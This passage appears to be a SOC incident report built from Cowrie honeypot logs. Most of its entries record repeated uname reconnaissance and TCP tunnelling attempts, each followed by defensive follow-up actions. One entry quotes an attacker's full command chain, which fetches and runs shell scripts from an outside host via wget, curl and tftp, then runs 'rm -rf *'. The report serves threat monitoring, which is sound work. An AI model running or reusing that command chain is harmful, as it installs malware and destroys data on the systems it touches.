| `2026-09-19 19:38:40` | `cowrie.login.success` |
| `2026-09-19 19:38:40` | `cowrie.session.params` |
| `2026-09-19 19:38:40` | `cowrie.command.input` |
| `2026-09-19 19:38:40` | `cowrie.log.closed` |
| `2026-09-19 19:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebcfeec99912

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:40 |
| **Last Seen** | 2026-09-19 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:40:04` | `cowrie.session.connect` |
| `2026-09-19 19:40:04` | `cowrie.client.version` |
| `2026-09-19 19:40:04` | `cowrie.client.kex` |
| `2026-09-19 19:40:04` | `cowrie.login.success` |
| `2026-09-19 19:40:05` | `cowrie.session.params` |
| `2026-09-19 19:40:05` | `cowrie.command.input` |
| `2026-09-19 19:40:05` | `cowrie.log.closed` |
| `2026-09-19 19:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715ec5498a1c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:42 |
| **Last Seen** | 2026-09-19 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:42:13` | `cowrie.session.connect` |
| `2026-09-19 19:42:13` | `cowrie.client.version` |
| `2026-09-19 19:42:13` | `cowrie.client.kex` |
| `2026-09-19 19:42:14` | `cowrie.login.success` |
| `2026-09-19 19:42:14` | `cowrie.session.params` |
| `2026-09-19 19:42:15` | `cowrie.command.input` |
| `2026-09-19 19:42:15` | `cowrie.log.closed` |
| `2026-09-19 19:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f911abd4e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:44 |
| **Last Seen** | 2026-09-19 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:44:27` | `cowrie.session.connect` |
| `2026-09-19 19:44:27` | `cowrie.client.version` |
| `2026-09-19 19:44:27` | `cowrie.client.kex` |
| `2026-09-19 19:44:28` | `cowrie.login.success` |
| `2026-09-19 19:44:28` | `cowrie.session.params` |
| `2026-09-19 19:44:28` | `cowrie.command.input` |
| `2026-09-19 19:44:28` | `cowrie.log.closed` |
| `2026-09-19 19:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9893ef81d7d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:46 |
| **Last Seen** | 2026-09-19 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:46:14` | `cowrie.session.connect` |
| `2026-09-19 19:46:14` | `cowrie.client.version` |
| `2026-09-19 19:46:14` | `cowrie.client.kex` |
| `2026-09-19 19:46:14` | `cowrie.login.success` |
| `2026-09-19 19:46:15` | `cowrie.session.params` |
| `2026-09-19 19:46:15` | `cowrie.command.input` |
| `2026-09-19 19:46:15` | `cowrie.log.closed` |
| `2026-09-19 19:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02d1261671b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:48 |
| **Last Seen** | 2026-09-19 19:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:48:28` | `cowrie.session.connect` |
| `2026-09-19 19:48:28` | `cowrie.client.version` |
| `2026-09-19 19:48:29` | `cowrie.client.kex` |
| `2026-09-19 19:48:30` | `cowrie.login.success` |
| `2026-09-19 19:48:31` | `cowrie.session.params` |
| `2026-09-19 19:48:31` | `cowrie.command.input` |
| `2026-09-19 19:48:31` | `cowrie.log.closed` |
| `2026-09-19 19:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb60920e4c2

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-19 19:48 |
| **Last Seen** | 2026-09-19 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:48:31` | `cowrie.session.connect` |
| `2026-09-19 19:48:31` | `cowrie.client.version` |
| `2026-09-19 19:48:31` | `cowrie.client.kex` |
| `2026-09-19 19:48:31` | `cowrie.login.success` |
| `2026-09-19 19:48:33` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:48:33` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:48:33` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:48:35` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:48:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:48:35` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:48:36` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:48:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:48:36` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce5979750e5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-19 19:50 |
| **Last Seen** | 2026-09-19 19:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:50:38` | `cowrie.session.connect` |
| `2026-09-19 19:50:38` | `cowrie.client.version` |
| `2026-09-19 19:50:38` | `cowrie.client.kex` |
| `2026-09-19 19:50:39` | `cowrie.login.success` |
| `2026-09-19 19:50:41` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:50:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:50:41` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:50:42` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:50:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:50:43` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:50:43` | `cowrie.direct-tcpip.request` |
| `2026-09-19 19:50:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 19:50:43` | `cowrie.direct-tcpip.data` |
| `2026-09-19 19:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3e6feef19a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:50 |
| **Last Seen** | 2026-09-19 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:50:46` | `cowrie.session.connect` |
| `2026-09-19 19:50:46` | `cowrie.client.version` |
| `2026-09-19 19:50:46` | `cowrie.client.kex` |
| `2026-09-19 19:50:46` | `cowrie.login.success` |
| `2026-09-19 19:50:47` | `cowrie.session.params` |
| `2026-09-19 19:50:47` | `cowrie.command.input` |
| `2026-09-19 19:50:47` | `cowrie.log.closed` |
| `2026-09-19 19:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13bbac647b1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:52 |
| **Last Seen** | 2026-09-19 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:52:12` | `cowrie.session.connect` |
| `2026-09-19 19:52:12` | `cowrie.client.version` |
| `2026-09-19 19:52:12` | `cowrie.client.kex` |
| `2026-09-19 19:52:12` | `cowrie.login.success` |
| `2026-09-19 19:52:13` | `cowrie.session.params` |
| `2026-09-19 19:52:13` | `cowrie.command.input` |
| `2026-09-19 19:52:13` | `cowrie.log.closed` |
| `2026-09-19 19:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e146f4ad651f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:54 |
| **Last Seen** | 2026-09-19 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:54:18` | `cowrie.session.connect` |
| `2026-09-19 19:54:18` | `cowrie.client.version` |
| `2026-09-19 19:54:18` | `cowrie.client.kex` |
| `2026-09-19 19:54:18` | `cowrie.login.success` |
| `2026-09-19 19:54:19` | `cowrie.session.params` |
| `2026-09-19 19:54:19` | `cowrie.command.input` |
| `2026-09-19 19:54:19` | `cowrie.log.closed` |
| `2026-09-19 19:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b544b066feb1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:56 |
| **Last Seen** | 2026-09-19 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:56:33` | `cowrie.session.connect` |
| `2026-09-19 19:56:33` | `cowrie.client.version` |
| `2026-09-19 19:56:33` | `cowrie.client.kex` |
| `2026-09-19 19:56:34` | `cowrie.login.success` |
| `2026-09-19 19:56:35` | `cowrie.session.params` |
| `2026-09-19 19:56:35` | `cowrie.command.input` |
| `2026-09-19 19:56:35` | `cowrie.log.closed` |
| `2026-09-19 19:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ece7cb36c4e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 19:58 |
| **Last Seen** | 2026-09-19 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:58:46` | `cowrie.session.connect` |
| `2026-09-19 19:58:46` | `cowrie.client.version` |
| `2026-09-19 19:58:46` | `cowrie.client.kex` |
| `2026-09-19 19:58:46` | `cowrie.login.success` |
| `2026-09-19 19:58:47` | `cowrie.session.params` |
| `2026-09-19 19:58:47` | `cowrie.command.input` |
| `2026-09-19 19:58:47` | `cowrie.log.closed` |
| `2026-09-19 19:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72de05010e6f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:01 |
| **Last Seen** | 2026-09-19 20:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:01:03` | `cowrie.session.connect` |
| `2026-09-19 20:01:03` | `cowrie.client.version` |
| `2026-09-19 20:01:03` | `cowrie.client.kex` |
| `2026-09-19 20:01:04` | `cowrie.login.success` |
| `2026-09-19 20:01:04` | `cowrie.session.params` |
| `2026-09-19 20:01:04` | `cowrie.command.input` |
| `2026-09-19 20:01:05` | `cowrie.log.closed` |
| `2026-09-19 20:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf23b5019db

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:03 |
| **Last Seen** | 2026-09-19 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:03:20` | `cowrie.session.connect` |
| `2026-09-19 20:03:20` | `cowrie.client.version` |
| `2026-09-19 20:03:20` | `cowrie.client.kex` |
| `2026-09-19 20:03:20` | `cowrie.login.success` |
| `2026-09-19 20:03:21` | `cowrie.session.params` |
| `2026-09-19 20:03:21` | `cowrie.command.input` |
| `2026-09-19 20:03:21` | `cowrie.log.closed` |
| `2026-09-19 20:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc22db860059

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:05 |
| **Last Seen** | 2026-09-19 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:05:28` | `cowrie.session.connect` |
| `2026-09-19 20:05:28` | `cowrie.client.version` |
| `2026-09-19 20:05:28` | `cowrie.client.kex` |
| `2026-09-19 20:05:28` | `cowrie.login.success` |
| `2026-09-19 20:05:29` | `cowrie.session.params` |
| `2026-09-19 20:05:29` | `cowrie.command.input` |
| `2026-09-19 20:05:29` | `cowrie.log.closed` |
| `2026-09-19 20:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ac72525d3a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:07 |
| **Last Seen** | 2026-09-19 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:07:38` | `cowrie.session.connect` |
| `2026-09-19 20:07:38` | `cowrie.client.version` |
| `2026-09-19 20:07:38` | `cowrie.client.kex` |
| `2026-09-19 20:07:38` | `cowrie.login.success` |
| `2026-09-19 20:07:39` | `cowrie.session.params` |
| `2026-09-19 20:07:39` | `cowrie.command.input` |
| `2026-09-19 20:07:39` | `cowrie.log.closed` |
| `2026-09-19 20:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0e683d30d44

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:09 |
| **Last Seen** | 2026-09-19 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:09:55` | `cowrie.session.connect` |
| `2026-09-19 20:09:55` | `cowrie.client.version` |
| `2026-09-19 20:09:56` | `cowrie.client.kex` |
| `2026-09-19 20:09:56` | `cowrie.login.success` |
| `2026-09-19 20:09:56` | `cowrie.session.params` |
| `2026-09-19 20:09:56` | `cowrie.command.input` |
| `2026-09-19 20:09:57` | `cowrie.log.closed` |
| `2026-09-19 20:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a7c55535068

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:12 |
| **Last Seen** | 2026-09-19 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:12:10` | `cowrie.session.connect` |
| `2026-09-19 20:12:10` | `cowrie.client.version` |
| `2026-09-19 20:12:10` | `cowrie.client.kex` |
| `2026-09-19 20:12:11` | `cowrie.login.success` |
| `2026-09-19 20:12:12` | `cowrie.session.params` |
| `2026-09-19 20:12:12` | `cowrie.command.input` |
| `2026-09-19 20:12:12` | `cowrie.log.closed` |
| `2026-09-19 20:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70882119a56f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:14 |
| **Last Seen** | 2026-09-19 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:14:33` | `cowrie.session.connect` |
| `2026-09-19 20:14:33` | `cowrie.client.version` |
| `2026-09-19 20:14:34` | `cowrie.client.kex` |
| `2026-09-19 20:14:34` | `cowrie.login.success` |
| `2026-09-19 20:14:35` | `cowrie.session.params` |
| `2026-09-19 20:14:35` | `cowrie.command.input` |
| `2026-09-19 20:14:35` | `cowrie.log.closed` |
| `2026-09-19 20:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a459c941d049

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:16 |
| **Last Seen** | 2026-09-19 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:16:12` | `cowrie.session.connect` |
| `2026-09-19 20:16:12` | `cowrie.client.version` |
| `2026-09-19 20:16:12` | `cowrie.client.kex` |
| `2026-09-19 20:16:13` | `cowrie.login.success` |
| `2026-09-19 20:16:13` | `cowrie.session.params` |
| `2026-09-19 20:16:13` | `cowrie.command.input` |
| `2026-09-19 20:16:13` | `cowrie.log.closed` |
| `2026-09-19 20:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b0d4dfd695

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:17 |
| **Last Seen** | 2026-09-19 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:17:46` | `cowrie.session.connect` |
| `2026-09-19 20:17:46` | `cowrie.client.version` |
| `2026-09-19 20:17:46` | `cowrie.client.kex` |
| `2026-09-19 20:17:46` | `cowrie.login.success` |
| `2026-09-19 20:17:47` | `cowrie.session.params` |
| `2026-09-19 20:17:47` | `cowrie.command.input` |
| `2026-09-19 20:17:47` | `cowrie.log.closed` |
| `2026-09-19 20:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e588b2dd903e

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-19 20:20 |
| **Last Seen** | 2026-09-19 20:20 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:20:02` | `cowrie.session.connect` |
| `2026-09-19 20:20:02` | `cowrie.login.success` |
| `2026-09-19 20:20:03` | `cowrie.session.params` |
| `2026-09-19 20:20:04` | `cowrie.command.input` |
| `2026-09-19 20:20:04` | `cowrie.command.input` |
| `2026-09-19 20:20:04` | `cowrie.session.file_download` |
| `2026-09-19 20:20:04` | `cowrie.session.file_download` |
| `2026-09-19 20:20:04` | `cowrie.session.file_download` |
| `2026-09-19 20:20:05` | `cowrie.session.file_download` |
| `2026-09-19 20:20:05` | `cowrie.session.file_download.failed` |
| `2026-09-19 20:20:05` | `cowrie.session.file_download` |
| `2026-09-19 20:20:05` | `cowrie.session.file_download` |
| `2026-09-19 20:20:19` | `cowrie.log.closed` |
| `2026-09-19 20:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f872e7842d91

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:20 |
| **Last Seen** | 2026-09-19 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:20:03` | `cowrie.session.connect` |
| `2026-09-19 20:20:03` | `cowrie.client.version` |
| `2026-09-19 20:20:03` | `cowrie.client.kex` |
| `2026-09-19 20:20:03` | `cowrie.login.success` |
| `2026-09-19 20:20:04` | `cowrie.session.params` |
| `2026-09-19 20:20:04` | `cowrie.command.input` |
| `2026-09-19 20:20:04` | `cowrie.log.closed` |
| `2026-09-19 20:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

